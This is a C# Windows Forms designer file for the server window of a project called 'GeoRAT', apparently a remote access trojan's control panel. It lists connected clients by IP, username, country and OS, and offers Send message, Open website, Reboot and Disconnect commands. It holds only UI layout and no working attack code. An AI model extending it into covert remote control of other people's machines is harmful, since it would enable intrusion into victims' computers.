namespace GeoRAT.Server
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.lvConnections = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.Commands = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.sendMessageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.openWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rebootToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Flags = new System.Windows.Forms.ImageList(this.components);
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.menuToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.label1 = new System.Windows.Forms.Label();
            this.Commands.SuspendLayout();
            this.menuStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // lvConnections
            // 
            this.lvConnections.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4});
            this.lvConnections.ContextMenuStrip = this.Commands;
            this.lvConnections.GridLines = true;
            this.lvConnections.Location = new System.Drawing.Point(0, 27);
            this.lvConnections.Name = "lvConnections";
            this.lvConnections.Size = new System.Drawing.Size(1045, 412);
            this.lvConnections.SmallImageList = this.Flags;
            this.lvConnections.TabIndex = 0;
            this.lvConnections.UseCompatibleStateImageBehavior = false;
            this.lvConnections.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "IP Address:";
            this.columnHeader1.Width = 200;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Client username:";
            this.columnHeader2.Width = 200;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "Country:";
            this.columnHeader3.Width = 170;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Operating System:";
            this.columnHeader4.Width = 200;
            // 
            // Commands
            // 
            this.Commands.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.Commands.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sendMessageToolStripMenuItem,
            this.openWebsiteToolStripMenuItem,
            this.rebootToolStripMenuItem,
            this.disconnectToolStripMenuItem});
            this.Commands.Name = "Commands";
            this.Commands.Size = new System.Drawing.Size(174, 100);
            // 
            // sendMessageToolStripMenuItem
            // 
            this.sendMessageToolStripMenuItem.Name = "sendMessageToolStripMenuItem";
            this.sendMessageToolStripMenuItem.Size = new System.Drawing.Size(173, 24);
            this.sendMessageToolStripMenuItem.Text = "Send message";
            this.sendMessageToolStripMenuItem.Click += new System.EventHandler(this.sendMessageToolStripMenuItem_Click);
            // 
            // openWebsiteToolStripMenuItem
            // 
            this.openWebsiteToolStripMenuItem.Name = "openWebsiteToolStripMenuItem";
            this.openWebsiteToolStripMenuItem.Size = new System.Drawing.Size(173, 24);
            this.openWebsiteToolStripMenuItem.Text = "Open website";
            this.openWebsiteToolStripMenuItem.Click += new System.EventHandler(this.openWebsiteToolStripMenuItem_Click);
            // 
            // rebootToolStripMenuItem
            // 
            this.rebootToolStripMenuItem.Name = "rebootToolStripMenuItem";
            this.rebootToolStripMenuItem.Size = new System.Drawing.Size(173, 24);
            this.rebootToolStripMenuItem.Text = "Reboot";
            this.rebootToolStripMenuItem.Click += new System.EventHandler(this.rebootToolStripMenuItem_Click);
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(173, 24);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
            // 
            // Flags
            // 
            this.Flags.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("Flags.ImageStream")));
            this.Flags.TransparentColor = System.Drawing.Color.Transparent;
            this.Flags.Images.SetKeyName(0, "Afghanistan.png");
            this.Flags.Images.SetKeyName(1, "African Union.png");
            this.Flags.Images.SetKeyName(2, "Albania.png");
            this.Flags.Images.SetKeyName(3, "Algeria.png");
            this.Flags.Images.SetKeyName(4, "American Samoa.png");
            this.Flags.Images.SetKeyName(5, "Andorra.png");
            this.Flags.Images.SetKeyName(6, "Angola.png");
            this.Flags.Images.SetKeyName(7, "Anguilla.png");
            this.Flags.Images.SetKeyName(8, "Antarctica.png");
            this.Flags.Images.SetKeyName(9, "Antigua & Barbuda.png");
            this.Flags.Images.SetKeyName(10, "Arab League.png");
            this.Flags.Images.SetKeyName(11, "Argentina.png");
            this.Flags.Images.SetKeyName(12, "Armenia.png");
            this.Flags.Images.SetKeyName(13, "Aruba.png");
            this.Flags.Images.SetKeyName(14, "ASEAN.png");
            this.Flags.Images.SetKeyName(15, "Australia.png");
            this.Flags.Images.SetKeyName(16, "Austria.png");
            this.Flags.Images.SetKeyName(17, "Azerbaijan.png");
            this.Flags.Images.SetKeyName(18, "Bahamas.png");
            this.Flags.Images.SetKeyName(19, "Bahrain.png");
            this.Flags.Images.SetKeyName(20, "Bangladesh.png");
            this.Flags.Images.SetKeyName(21, "Barbados.png");
            this.Flags.Images.SetKeyName(22, "Belarus.png");
            this.Flags.Images.SetKeyName(23, "Belgium.png");
            this.Flags.Images.SetKeyName(24, "Belize.png");
            this.Flags.Images.SetKeyName(25, "Benin.png");
            this.Flags.Images.SetKeyName(26, "Bermuda.png");
            this.Flags.Images.SetKeyName(27, "Bhutan.png");
            this.Flags.Images.SetKeyName(28, "Bolivia.png");
            this.Flags.Images.SetKeyName(29, "Bosnia & Herzegovina.png");
            this.Flags.Images.SetKeyName(30, "Botswana.png");
            this.Flags.Images.SetKeyName(31, "Brazil.png");
            this.Flags.Images.SetKeyName(32, "Brunei.png");
            this.Flags.Images.SetKeyName(33, "Bulgaria.png");
            this.Flags.Images.SetKeyName(34, "Burkina Faso.png");
            this.Flags.Images.SetKeyName(35, "Burundi.png");
            this.Flags.Images.SetKeyName(36, "Cambodja.png");
            this.Flags.Images.SetKeyName(37, "Cameroon.png");
            this.Flags.Images.SetKeyName(38, "Canada.png");
            this.Flags.Images.SetKeyName(39, "Cape Verde.png");
            this.Flags.Images.SetKeyName(40, "CARICOM.png");
            this.Flags.Images.SetKeyName(41, "Cayman Islands.png");
            this.Flags.Images.SetKeyName(42, "Central African Republic.png");
            this.Flags.Images.SetKeyName(43, "Chad.png");
            this.Flags.Images.SetKeyName(44, "Chile.png");
            this.Flags.Images.SetKeyName(45, "China.png");
            this.Flags.Images.SetKeyName(46, "CIS.png");
            this.Flags.Images.SetKeyName(47, "Colombia.png");
            this.Flags.Images.SetKeyName(48, "Commonwealth.png");
            this.Flags.Images.SetKeyName(49, "Comoros.png");
            this.Flags.Images.SetKeyName(50, "Congo-Brazzaville.png");
            this.Flags.Images.SetKeyName(51, "Congo-Kinshasa(Zaire).png");
            this.Flags.Images.SetKeyName(52, "Cook Islands.png");
            this.Flags.Images.SetKeyName(53, "Costa Rica.png");
            this.Flags.Images.SetKeyName(54, "Cote d\'Ivoire.png");
            this.Flags.Images.SetKeyName(55, "Croatia.png");
            this.Flags.Images.SetKeyName(56, "Cuba.png");
            this.Flags.Images.SetKeyName(57, "Cyprus.png");
            this.Flags.Images.SetKeyName(58, "Czech Republic.png");
            this.Flags.Images.SetKeyName(59, "Denmark.png");
            this.Flags.Images.SetKeyName(60, "Djibouti.png");
            this.Flags.Images.SetKeyName(61, "Dominica.png");
            this.Flags.Images.SetKeyName(62, "Dominican Republic.png");
            this.Flags.Images.SetKeyName(63, "Ecuador.png");
            this.Flags.Images.SetKeyName(64, "Egypt.png");
            this.Flags.Images.SetKeyName(65, "El Salvador.png");
            this.Flags.Images.SetKeyName(66, "England.png");
            this.Flags.Images.SetKeyName(67, "Equatorial Guinea.png");
            this.Flags.Images.SetKeyName(68, "Eritrea.png");
            this.Flags.Images.SetKeyName(69, "Estonia.png");
            this.Flags.Images.SetKeyName(70, "Ethiopia.png");
            this.Flags.Images.SetKeyName(71, "European Union.png");
            this.Flags.Images.SetKeyName(72, "Faroes.png");
            this.Flags.Images.SetKeyName(73, "Fiji.png");
            this.Flags.Images.SetKeyName(74, "Finland.png");
            this.Flags.Images.SetKeyName(75, "France.png");
            this.Flags.Images.SetKeyName(76, "Gabon.png");
            this.Flags.Images.SetKeyName(77, "Gambia.png");
            this.Flags.Images.SetKeyName(78, "Georgia.png");
            this.Flags.Images.SetKeyName(79, "Germany.png");
            this.Flags.Images.SetKeyName(80, "Ghana.png");
            this.Flags.Images.SetKeyName(81, "Gibraltar.png");
            this.Flags.Images.SetKeyName(82, "Greece.png");
            this.Flags.Images.SetKeyName(83, "Greenland.png");
            this.Flags.Images.SetKeyName(84, "Grenada.png");
            this.Flags.Images.SetKeyName(85, "Guadeloupe.png");
            this.Flags.Images.SetKeyName(86, "Guademala.png");
            this.Flags.Images.SetKeyName(87, "Guam.png");
            this.Flags.Images.SetKeyName(88, "Guernsey.png");
            this.Flags.Images.SetKeyName(89, "Guinea.png");
            this.Flags.Images.SetKeyName(90, "Guinea-Bissau.png");
            this.Flags.Images.SetKeyName(91, "Guyana.png");
            this.Flags.Images.SetKeyName(92, "Haiti.png");
            this.Flags.Images.SetKeyName(93, "Honduras.png");
            this.Flags.Images.SetKeyName(94, "Hong Kong.png");
            this.Flags.Images.SetKeyName(95, "Hungary.png");
            this.Flags.Images.SetKeyName(96, "Iceland.png");
            this.Flags.Images.SetKeyName(97, "India.png");
            this.Flags.Images.SetKeyName(98, "Indonesia.png");
            this.Flags.Images.SetKeyName(99, "Iran.png");
            this.Flags.Images.SetKeyName(100, "Iraq.png");
            this.Flags.Images.SetKeyName(101, "Ireland.png");
            this.Flags.Images.SetKeyName(102, "Islamic Conference.png");
            this.Flags.Images.SetKeyName(103, "Isle of Man.png");
            this.Flags.Images.SetKeyName(104, "Israel.png");
            this.Flags.Images.SetKeyName(105, "Italy.png");
            this.Flags.Images.SetKeyName(106, "Jamaica.png");
            this.Flags.Images.SetKeyName(107, "Japan.png");
            this.Flags.Images.SetKeyName(108, "Jersey.png");
            this.Flags.Images.SetKeyName(109, "Jordan.png");
            this.Flags.Images.SetKeyName(110, "Kazakhstan.png");
            this.Flags.Images.SetKeyName(111, "Kenya.png");
            this.Flags.Images.SetKeyName(112, "Kiribati.png");
            this.Flags.Images.SetKeyName(113, "Kosovo.png");
            this.Flags.Images.SetKeyName(114, "Kuwait.png");
            this.Flags.Images.SetKeyName(115, "Kyrgyzstan.png");
            this.Flags.Images.SetKeyName(116, "Laos.png");
            this.Flags.Images.SetKeyName(117, "Latvia.png");
            this.Flags.Images.SetKeyName(118, "Lebanon.png");
            this.Flags.Images.SetKeyName(119, "Lesotho.png");
            this.Flags.Images.SetKeyName(120, "Liberia.png");
            this.Flags.Images.SetKeyName(121, "Libya.png");
            this.Flags.Images.SetKeyName(122, "Liechtenstein.png");
            this.Flags.Images.SetKeyName(123, "Lithuania.png");
            this.Flags.Images.SetKeyName(124, "Luxembourg.png");
            this.Flags.Images.SetKeyName(125, "Macao.png");
            this.Flags.Images.SetKeyName(126, "Macedonia.png");
            this.Flags.Images.SetKeyName(127, "Madagascar.png");
            this.Flags.Images.SetKeyName(128, "Malawi.png");
            this.Flags.Images.SetKeyName(129, "Malaysia.png");
            this.Flags.Images.SetKeyName(130, "Maldives.png");
            this.Flags.Images.SetKeyName(131, "Mali.png");
            this.Flags.Images.SetKeyName(132, "Malta.png");
            this.Flags.Images.SetKeyName(133, "Marshall Islands.png");
            this.Flags.Images.SetKeyName(134, "Martinique.png");
            this.Flags.Images.SetKeyName(135, "Mauritania.png");
            this.Flags.Images.SetKeyName(136, "Mauritius.png");
            this.Flags.Images.SetKeyName(137, "Mexico.png");
            this.Flags.Images.SetKeyName(138, "Micronesia.png");
            this.Flags.Images.SetKeyName(139, "Moldova.png");
            this.Flags.Images.SetKeyName(140, "Monaco.png");
            this.Flags.Images.SetKeyName(141, "Mongolia.png");
            this.Flags.Images.SetKeyName(142, "Montenegro.png");
            this.Flags.Images.SetKeyName(143, "Montserrat.png");
            this.Flags.Images.SetKeyName(144, "Morocco.png");
            this.Flags.Images.SetKeyName(145, "Mozambique.png");
            this.Flags.Images.SetKeyName(146, "Myanmar(Burma).png");
            this.Flags.Images.SetKeyName(147, "Namibia.png");
            this.Flags.Images.SetKeyName(148, "NATO.png");
            this.Flags.Images.SetKeyName(149, "Nauru.png");
            this.Flags.Images.SetKeyName(150, "Nepal.png");
            this.Flags.Images.SetKeyName(151, "Netherlands Antilles.png");
            this.Flags.Images.SetKeyName(152, "Netherlands.png");
            this.Flags.Images.SetKeyName(153, "New Caledonia.png");
            this.Flags.Images.SetKeyName(154, "New Zealand.png");
            this.Flags.Images.SetKeyName(155, "Nicaragua.png");
            this.Flags.Images.SetKeyName(156, "Niger.png");
            this.Flags.Images.SetKeyName(157, "Nigeria.png");
            this.Flags.Images.SetKeyName(158, "North Korea.png");
            this.Flags.Images.SetKeyName(159, "Northern Cyprus.png");
            this.Flags.Images.SetKeyName(160, "Northern Ireland.png");
            this.Flags.Images.SetKeyName(161, "Norway.png");
            this.Flags.Images.SetKeyName(162, "Olimpic Movement.png");
            this.Flags.Images.SetKeyName(163, "Oman.png");
            this.Flags.Images.SetKeyName(164, "OPEC.png");
            this.Flags.Images.SetKeyName(165, "Pakistan.png");
            this.Flags.Images.SetKeyName(166, "Palau.png");
            this.Flags.Images.SetKeyName(167, "Palestine.png");
            this.Flags.Images.SetKeyName(168, "Panama.png");
            this.Flags.Images.SetKeyName(169, "Papua New Guinea.png");
            this.Flags.Images.SetKeyName(170, "Paraguay.png");
            this.Flags.Images.SetKeyName(171, "Peru.png");
            this.Flags.Images.SetKeyName(172, "Philippines.png");
            this.Flags.Images.SetKeyName(173, "Poland.png");
            this.Flags.Images.SetKeyName(174, "Portugal.png");
            this.Flags.Images.SetKeyName(175, "Puerto Rico.png");
            this.Flags.Images.SetKeyName(176, "Qatar.png");
            this.Flags.Images.SetKeyName(177, "Red Cross.png");
            this.Flags.Images.SetKeyName(178, "Reunion.png");
            this.Flags.Images.SetKeyName(179, "Romania.png");
            this.Flags.Images.SetKeyName(180, "Russian Federation.png");
            this.Flags.Images.SetKeyName(181, "Rwanda.png");
            this.Flags.Images.SetKeyName(182, "Saint Lucia.png");
            this.Flags.Images.SetKeyName(183, "Samoa.png");
            this.Flags.Images.SetKeyName(184, "San Marino.png");
            this.Flags.Images.SetKeyName(185, "Sao Tome & Principe.png");
            this.Flags.Images.SetKeyName(186, "Saudi Arabia.png");
            this.Flags.Images.SetKeyName(187, "Scotland.png");
            this.Flags.Images.SetKeyName(188, "Senegal.png");
            this.Flags.Images.SetKeyName(189, "Serbia.png");
            this.Flags.Images.SetKeyName(190, "Seyshelles.png");
            this.Flags.Images.SetKeyName(191, "Sierra Leone.png");
            this.Flags.Images.SetKeyName(192, "Singapore.png");
            this.Flags.Images.SetKeyName(193, "Slovakia.png");
            this.Flags.Images.SetKeyName(194, "Slovenia.png");
            this.Flags.Images.SetKeyName(195, "Solomon Islands.png");
            this.Flags.Images.SetKeyName(196, "Somalia.png");
            this.Flags.Images.SetKeyName(197, "Somaliland.png");
            this.Flags.Images.SetKeyName(198, "South Afriica.png");
            this.Flags.Images.SetKeyName(199, "South Korea.png");
            this.Flags.Images.SetKeyName(200, "Spain.png");
            this.Flags.Images.SetKeyName(201, "Sri Lanka.png");
            this.Flags.Images.SetKeyName(202, "St Kitts & Nevis.png");
            this.Flags.Images.SetKeyName(203, "St Vincent & the Grenadines.png");
            this.Flags.Images.SetKeyName(204, "Sudan.png");
            this.Flags.Images.SetKeyName(205, "Suriname.png");
            this.Flags.Images.SetKeyName(206, "Swaziland.png");
            this.Flags.Images.SetKeyName(207, "Sweden.png");
            this.Flags.Images.SetKeyName(208, "Switzerland.png");
            this.Flags.Images.SetKeyName(209, "Syria.png");
            this.Flags.Images.SetKeyName(210, "Tahiti(French Polinesia).png");
            this.Flags.Images.SetKeyName(211, "Taiwan.png");
            this.Flags.Images.SetKeyName(212, "Tajikistan.png");
            this.Flags.Images.SetKeyName(213, "Tanzania.png");
            this.Flags.Images.SetKeyName(214, "Thailand.png");
            this.Flags.Images.SetKeyName(215, "Timor-Leste.png");
            this.Flags.Images.SetKeyName(216, "Togo.png");
            this.Flags.Images.SetKeyName(217, "Tonga.png");
            this.Flags.Images.SetKeyName(218, "Trinidad & Tobago.png");
            this.Flags.Images.SetKeyName(219, "Tunisia.png");
            this.Flags.Images.SetKeyName(220, "Turkey.png");
            this.Flags.Images.SetKeyName(221, "Turkmenistan.png");
            this.Flags.Images.SetKeyName(222, "Turks and Caicos Islands.png");
            this.Flags.Images.SetKeyName(223, "Tuvalu.png");
            this.Flags.Images.SetKeyName(224, "Uganda.png");
            this.Flags.Images.SetKeyName(225, "Ukraine.png");
            this.Flags.Images.SetKeyName(226, "United Arab Emirates.png");
            this.Flags.Images.SetKeyName(227, "United Kingdom(Great Britain).png");
            this.Flags.Images.SetKeyName(228, "United Nations.png");
            this.Flags.Images.SetKeyName(229, "United States of America.png");
            this.Flags.Images.SetKeyName(230, "Uruguay.png");
            this.Flags.Images.SetKeyName(231, "Uzbekistan.png");
            this.Flags.Images.SetKeyName(232, "Vanutau.png");
            this.Flags.Images.SetKeyName(233, "Vatican City.png");
            this.Flags.Images.SetKeyName(234, "Venezuela.png");
            this.Flags.Images.SetKeyName(235, "Viet Nam.png");
            this.Flags.Images.SetKeyName(236, "Virgin Islands British.png");
            this.Flags.Images.SetKeyName(237, "Virgin Islands US.png");
            this.Flags.Images.SetKeyName(238, "Wales.png");
            this.Flags.Images.SetKeyName(239, "Western Sahara.png");
            this.Flags.Images.SetKeyName(240, "Yemen.png");
            this.Flags.Images.SetKeyName(241, "Zambia.png");
            this.Flags.Images.SetKeyName(242, "Zimbabwe.png");
            // 
            // menuStrip1
            // 
            this.menuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.menuToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new System.Drawing.Size(1045, 28);
            this.menuStrip1.TabIndex = 1;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // menuToolStripMenuItem
            // 
            this.menuToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem});
            this.menuToolStripMenuItem.Name = "menuToolStripMenuItem";
            this.menuToolStripMenuItem.Size = new System.Drawing.Size(58, 24);
            this.menuToolStripMenuItem.Text = "Menu";
            // 
            // startToolStripMenuItem
            // 
            this.startToolStripMenuItem.Name = "startToolStripMenuItem";
            this.startToolStripMenuItem.Size = new System.Drawing.Size(115, 26);
            this.startToolStripMenuItem.Text = "Start";
            this.startToolStripMenuItem.Click += new System.EventHandler(this.startToolStripMenuItem_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(12, 442);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(142, 17);
            this.label1.TabIndex = 2;
            this.label1.Text = "Clients Connected : 0";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1045, 464);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.lvConnections);
            this.Controls.Add(this.menuStrip1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.menuStrip1;
            this.Name = "Form1";
            this.Text = "GeoRAT";
            this.Commands.ResumeLayout(false);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.ListView lvConnections;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.ImageList Flags;
        private System.Windows.Forms.MenuStrip menuStrip1;
        private System.Windows.Forms.ToolStripMenuItem menuToolStripMenuItem;
        private System.Windows.Forms.ContextMenuStrip Commands;
        private System.Windows.Forms.ToolStripMenuItem sendMessageToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem openWebsiteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem rebootToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem;
        private System.Windows.Forms.Label label1;
    }
}

